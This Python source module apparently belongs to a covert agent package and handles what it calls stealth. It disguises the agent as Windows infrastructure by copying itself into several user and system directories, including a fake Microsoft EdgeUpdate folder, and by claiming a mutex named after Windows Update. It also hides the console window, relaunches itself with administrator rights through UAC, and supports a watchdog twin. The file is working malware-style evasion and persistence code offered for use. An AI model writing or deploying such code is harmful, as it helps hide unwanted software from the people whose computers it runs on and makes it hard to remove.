"""Naming, console hiding and single-instance handling.

The goal is for the agent to look like a boring piece of Windows
infrastructure rather than "some script someone ran".
"""

from __future__ import annotations

import ctypes
from ctypes import wintypes
import os
import sys
import tempfile
import time
from typing import Optional

from .. import config

IS_WINDOWS = os.name == "nt"


# --------------------------------------------------------------------------
# Paths
# --------------------------------------------------------------------------


def bundle_root() -> str:
    """Directory that contains ``agent.py`` and the ``syspy`` package."""
    if getattr(sys, "frozen", False):
        return os.path.dirname(os.path.abspath(sys.executable))
    return os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


def executable_name() -> str:
    """File name the agent uses once installed."""
    return config.PRODUCT_NAME + (".exe" if getattr(sys, "frozen", False) else ".py")


def install_directories() -> list[str]:
    """Every directory the agent keeps a copy in."""
    if IS_WINDOWS:
        local = os.environ.get("LOCALAPPDATA", tempfile.gettempdir())
        roaming = os.environ.get("APPDATA", tempfile.gettempdir())
        program_data = os.environ.get("PROGRAMDATA", r"C:\ProgramData")
        return [
            os.path.join(local, config.WINDOWS_SUBDIR),
            os.path.join(roaming, config.WINDOWS_SUBDIR),
            os.path.join(program_data, config.WINDOWS_SUBDIR),
            os.path.join(local, "Microsoft", "EdgeUpdate"),
        ]
    home = os.path.expanduser("~")
    return [
        os.path.join(home, config.UNIX_SUBDIR),
        os.path.join(tempfile.gettempdir(), "windows-update-service"),
    ]


def primary_directory() -> str:
    """The directory the agent treats as its home."""
    return install_directories()[0]


def lock_path() -> str:
    """Single-instance lock file."""
    if IS_WINDOWS:
        base = os.environ.get("PROGRAMDATA") or tempfile.gettempdir()
        return os.path.join(base, config.WINDOWS_SUBDIR, "agent.lock")
    return os.path.join(tempfile.gettempdir(), "windowsupdateservice.lock")


def watchdog_lock_path() -> str:
    """Lock file used by the watchdog twin."""
    return lock_path().replace("agent.lock", "watchdog.lock")


def shim_path() -> str:
    return os.path.join(primary_directory(), config.PRODUCT_NAME + ".cmd")


def kit_cache_path() -> str:
    return os.path.join(primary_directory(), "kit.zip")


def state_path(name: str) -> str:
    """Path for a named state file in the primary directory."""
    return os.path.join(primary_directory(), name)


# --------------------------------------------------------------------------
# Privileges and console
# --------------------------------------------------------------------------


def is_admin() -> bool:
    """Return ``True`` when running with elevated privileges."""
    if IS_WINDOWS:
        try:
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        except Exception:
            return False
    try:
        return os.geteuid() == 0
    except Exception:
        return False


def elevate_process(args: list[str] | None = None, wait: bool = False) -> bool:
    """Relaunch with Administrator privileges via Windows UAC runas.

    When ``wait`` is True, blocks until the elevated child process exits.
    """
    if not IS_WINDOWS:
        return False
    if os.environ.get("SYSPY_NO_UAC") == "1":
        return False
    if is_admin():
        return True
    try:
        cmd_args = list(sys.argv[1:] if args is None else args)
        if "--no-elevate" in cmd_args:
            cmd_args.remove("--no-elevate")

        if getattr(sys, "frozen", False) or sys.argv[0].lower().endswith(".exe"):
            exe = sys.executable
            params = " ".join(f'"{a}"' for a in cmd_args)
        else:
            exe = sys.executable
            # If wait is not requested (background agent launch), prefer pythonw.exe to prevent any console window
            if not wait and exe.lower().endswith("python.exe"):
                windowless = exe[:-len("python.exe")] + "pythonw.exe"
                if os.path.exists(windowless):
                    exe = windowless
            root = bundle_root()
            script = os.path.join(root, "agent.py")
            if not os.path.isfile(script):
                script = os.path.abspath(sys.argv[0])
            params = f'"{script}" ' + " ".join(f'"{a}"' for a in cmd_args)

        if wait:
            class SHELLEXECUTEINFO(ctypes.Structure):
                _fields_ = [
                    ("cbSize", wintypes.DWORD),
                    ("fMask", wintypes.ULONG),
                    ("hwnd", wintypes.HWND),
                    ("lpVerb", wintypes.LPCWSTR),
                    ("lpFile", wintypes.LPCWSTR),
                    ("lpParameters", wintypes.LPCWSTR),
                    ("lpDirectory", wintypes.LPCWSTR),
                    ("nShow", ctypes.c_int),
                    ("hInstApp", wintypes.HINSTANCE),
                    ("lpIDList", wintypes.LPVOID),
                    ("lpClass", wintypes.LPCWSTR),
                    ("hkeyClass", wintypes.HKEY),
                    ("dwHotKey", wintypes.DWORD),
                    ("hIconOrMonitor", wintypes.HANDLE),
                    ("hProcess", wintypes.HANDLE),
                ]

            sei = SHELLEXECUTEINFO()
            sei.cbSize = ctypes.sizeof(sei)
            sei.fMask = 0x00000040  # SEE_MASK_NOCLOSEPROCESS
            sei.lpVerb = "runas"
            sei.lpFile = exe
            sei.lpParameters = params
            sei.nShow = 1  # SW_SHOWNORMAL

            res = ctypes.windll.shell32.ShellExecuteExW(ctypes.byref(sei))
            if res and sei.hProcess:
                ctypes.windll.kernel32.WaitForSingleObject(sei.hProcess, 0xFFFFFFFF)
                exit_code = wintypes.DWORD()
                ctypes.windll.kernel32.GetExitCodeProcess(sei.hProcess, ctypes.byref(exit_code))
                ctypes.windll.kernel32.CloseHandle(sei.hProcess)
                return exit_code.value == 0
            return False
        else:
            ret = ctypes.windll.shell32.ShellExecuteW(None, "runas", exe, params, None, 1)
            return ret > 32
    except Exception:
        return False


def hide_console() -> str:
    """Hide the console window, if there is one."""
    if not IS_WINDOWS:
        return "n/a"
    try:
        window = ctypes.windll.kernel32.GetConsoleWindow()
        if not window:
            return "no console"
        ctypes.windll.user32.ShowWindow(window, 0)
        return "console hidden"
    except Exception as error:
        return f"hide failed: {error}"


def show_console() -> str:
    """Show the console window again."""
    if not IS_WINDOWS:
        return "n/a"
    try:
        window = ctypes.windll.kernel32.GetConsoleWindow()
        if not window:
            return "no console"
        ctypes.windll.user32.ShowWindow(window, 5)
        return "console shown"
    except Exception as error:
        return f"show failed: {error}"


def set_console_title(title: str) -> None:
    """Set the console window title, which is what a curious user sees."""
    if not IS_WINDOWS:
        return
    try:
        ctypes.windll.kernel32.SetConsoleTitleW(title)
    except Exception:
        pass


def disable_quick_edit() -> None:
    """Stop the console from freezing on a click."""
    if not IS_WINDOWS:
        return
    try:
        handle = ctypes.windll.kernel32.GetStdHandle(-10)
        mode = ctypes.c_uint()
        if ctypes.windll.kernel32.GetConsoleMode(handle, ctypes.byref(mode)):
            ctypes.windll.kernel32.SetConsoleMode(handle, mode.value & ~0x0040)
    except Exception:
        pass


# --------------------------------------------------------------------------
# Single instance
# --------------------------------------------------------------------------


def process_alive(pid: int) -> bool:
    """Return ``True`` when ``pid`` is running."""
    if not pid:
        return False
    if IS_WINDOWS:
        try:
            # 0x0400 is PROCESS_QUERY_INFORMATION (0x1000 was PROCESS_QUERY_LIMITED_INFORMATION)
            handle = ctypes.windll.kernel32.OpenProcess(0x0400, 0, pid)
            if handle:
                exit_code = ctypes.c_ulong()
                ctypes.windll.kernel32.GetExitCodeProcess(handle, ctypes.byref(exit_code))
                ctypes.windll.kernel32.CloseHandle(handle)
                # 259 is STILL_ACTIVE
                return exit_code.value == 259
            return False
        except Exception:
            return False
    try:
        os.kill(pid, 0)
        return True
    except OSError:
        return False


def read_pid(path: str) -> int:
    """Read a pid from ``path``, returning 0 when unavailable."""
    try:
        with open(path, "r", encoding="ascii") as handle:
            return int(handle.read().strip() or 0)
    except (OSError, ValueError):
        return 0


def write_pid(path: str, pid: Optional[int] = None) -> None:
    """Write ``pid`` (default: this process) to ``path``."""
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="ascii") as handle:
            handle.write(str(pid if pid is not None else os.getpid()))
    except OSError:
        pass


_GLOBAL_MUTEX = None


def acquire_single_instance(takeover_pid: int = 0, attempts: int = 40) -> bool:
    """Claim the single-instance lock via global Windows Mutex and file lock.

    Returns ``True`` when another live agent already owns it.
    """
    global _GLOBAL_MUTEX
    if IS_WINDOWS:
        try:
            # Global Mutex enforces single-instance across all sessions and elevation boundaries
            mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\WindowsUpdateServiceMutex")
            last_err = ctypes.windll.kernel32.GetLastError()
            if last_err in (183, 5):  # 183: ERROR_ALREADY_EXISTS, 5: ERROR_ACCESS_DENIED (owned by elevated agent)
                if takeover_pid and takeover_pid != os.getpid():
                    for _ in range(attempts):
                        time.sleep(0.3)
                        if not process_alive(takeover_pid):
                            break
                    if not process_alive(takeover_pid):
                        _GLOBAL_MUTEX = mutex
                        return False
                if mutex:
                    ctypes.windll.kernel32.CloseHandle(mutex)
                return True
            _GLOBAL_MUTEX = mutex
        except Exception:
            pass

    path = lock_path()
    for _ in range(attempts):
        try:
            descriptor = os.open(path, os.O_CREAT | os.O_EXCL | os.O_WRONLY)
            try:
                os.write(descriptor, str(os.getpid()).encode("ascii"))
            finally:
                os.close(descriptor)
            return False
        except FileExistsError:
            pass
        except OSError:
            return False

        owner = read_pid(path)
        if owner and owner != os.getpid() and process_alive(owner):
            if takeover_pid and owner == takeover_pid:
                time.sleep(0.5)
                continue
            return True

        time.sleep(0.4)
        try:
            os.remove(path)
        except OSError:
            pass
    return False


def release_single_instance() -> None:
    """Drop the lock if we own it."""
    global _GLOBAL_MUTEX
    if IS_WINDOWS and _GLOBAL_MUTEX:
        try:
            ctypes.windll.kernel32.CloseHandle(_GLOBAL_MUTEX)
        except Exception:
            pass
        _GLOBAL_MUTEX = None
    path = lock_path()
    if read_pid(path) == os.getpid():
        try:
            os.remove(path)
        except OSError:
            pass


def description() -> dict[str, object]:
    """Diagnostics for the ``stealth.info`` command."""
    return {
        "product": config.PRODUCT_NAME,
        "description": config.PRODUCT_DESCRIPTION,
        "bundle_root": bundle_root(),
        "entry": os.path.join(bundle_root(), executable_name()),
        "install_dirs": install_directories(),
        "admin": is_admin(),
        "frozen": bool(getattr(sys, "frozen", False)),
        "python": sys.version.split()[0],
        "executable": sys.executable,
    }
